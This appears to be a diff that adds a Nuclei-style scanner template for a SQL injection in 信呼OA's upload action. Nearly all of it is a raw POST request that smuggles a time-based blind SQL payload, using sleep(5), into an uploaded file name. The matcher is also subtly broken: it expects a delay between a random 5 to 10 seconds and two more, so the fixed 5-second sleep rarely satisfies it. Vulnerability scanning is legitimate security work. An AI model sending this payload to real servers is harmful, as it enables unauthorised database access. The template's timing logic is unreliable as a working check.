@@ -1,0 +1,38 @@
+id: poc-yaml-rockoa-uploawaction-php-sqli
+info:
+  name: 信呼OA uploawAction.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /index.php?a=upfile&m=uploaw|api&d=task HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitXo7nCpRwksqD9i
+
+        ------WebKitFormBoundaryitXo7nCpRwksqD9i
+        Content-Disposition: form-data; name="file"; filename="a',web=(select if(123=123,sleep(5),0))-- .png"
+
+        123
+        ------WebKitFormBoundaryitXo7nCpRwksqD9i--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"filepath\""
+          - "\"filename\""
+          - "\"ip\""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
